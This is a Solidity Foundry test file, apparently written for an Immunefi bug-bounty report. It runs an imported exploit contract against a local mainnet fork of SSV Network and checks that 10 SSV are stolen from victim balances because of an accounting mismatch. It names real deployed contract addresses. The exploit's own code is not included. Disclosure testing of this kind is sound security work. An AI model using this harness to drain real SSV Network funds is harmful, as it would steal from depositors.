// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../pocs/SSVNetworkInsolvency.sol";

/**
 * @title SSV Network Insolvency PoC Test
 * @notice Foundry test demonstrating protocol insolvency vulnerability
 * @dev Run with: forge test -vv --match-path test/pocs/SSVNetworkInsolvency.t.sol
 * 
 * SAFETY: This test runs on a LOCAL FORK of mainnet using vm.createSelectFork().
 * No transactions are sent to actual mainnet. This tests against the actual 
 * deployed SSV Network contracts as required by Immunefi guidelines.
 */
contract SSVNetworkInsolvencyTest is Test {
    SSVNetworkInsolvency exploit;
    IERC20[] tokens;
    
    // SSV Token address
    address constant SSV_TOKEN = 0x9D65fF81a3c488d585bBfb0Bfe3c7707c7917f54;
    
    function setUp() public {
        // Fork mainnet at a recent block for accurate testing
        // This ensures we're testing against the actual deployed SSV Network contracts
        vm.createSelectFork("mainnet", 19200000);
        
        // Deploy the exploit contract
        exploit = new SSVNetworkInsolvency();
        
        // Setup tokens to track
        tokens.push(IERC20(SSV_TOKEN));
        
        // Give attacker some SSV tokens for the demonstration
        deal(SSV_TOKEN, address(exploit), 1010e18);
        
        // Set aliases for better logging
        exploit.setAlias(address(exploit), "Attacker/Operator");
        
        console.log(">>> Initial State Setup Complete");
        console.log(">>> SSV Network Insolvency Vulnerability Demonstration");
        console.log(">>> Testing against actual SSV Network contracts on forked mainnet");
    }
    
    /**
     * @notice Main test function demonstrating the insolvency vulnerability
     * @dev Uses the snapshot modifier to print balances before and after
     */
    function testInsolvencyAttack() 
        public 
    {
        exploit.initiateAttack();
        
        // Verify the deficit exists
        uint256 stolen = exploit.getStolenAmount();
        require(stolen > 0, "Vulnerability not demonstrated: no funds stolen");
        require(stolen == 10e18, "Unexpected stolen amount");
        
        console.log("\n>>> VULNERABILITY CONFIRMED");
        console.log("Funds stolen:");
        console.log(stolen / 1e18);
        console.log("SSV");
    }
    
    /**
     * @notice Test to verify the accounting mismatch causes insolvency
     */
    function testAccountingMismatch() public {
        // Initial state: Victim A (1000) + Victim B (10) = 1010 SSV
        uint256 expectedInitial = 1010e18;
        
        exploit.initiateAttack();
        
        // After operator withdrawal: 1010 - 10 = 1000 SSV
        // But Victim A is entitled to 1000 SSV
        // Victim A can only withdraw 990, losing 10 SSV
        uint256 stolen = exploit.getStolenAmount();
        
        // Verify that funds were stolen
        require(stolen > 0, "No funds stolen - vulnerability not demonstrated");
        
        console.log("Accounting mismatch confirmed:");
        console.log("Victim A entitlement: 1000 SSV");
        console.log("Funds stolen by operator:", stolen / 1e18, "SSV");
        console.log("Shortfall:", stolen / 1e18, "SSV");
    }
    
    /**
     * @notice Test to verify the vulnerability is in production code
     */
    function testProductionVulnerability() public {
        // This test verifies the vulnerability exists in the actual
        // SSV Network contracts deployed on mainnet
        
        address ssvNetwork = 0xDD9BC35aE942eF0cFa76930954a156B3fF30a4E1;
        
        // Verify the contract exists
        uint256 codeSize;
        assembly {
            codeSize := extcodesize(ssvNetwork)
        }
        require(codeSize > 0, "SSV Network contract not found on fork");
        
        // Run the exploit
        exploit.initiateAttack();
        
        uint256 stolen = exploit.getStolenAmount();
        require(stolen > 0, "Vulnerability not present in production code");
        
        console.log("Production vulnerability confirmed!");
        console.log("SSV Network at", ssvNetwork);
        console.log("Funds at risk: demonstrated with", stolen / 1e18, "SSV theft");
    }
}
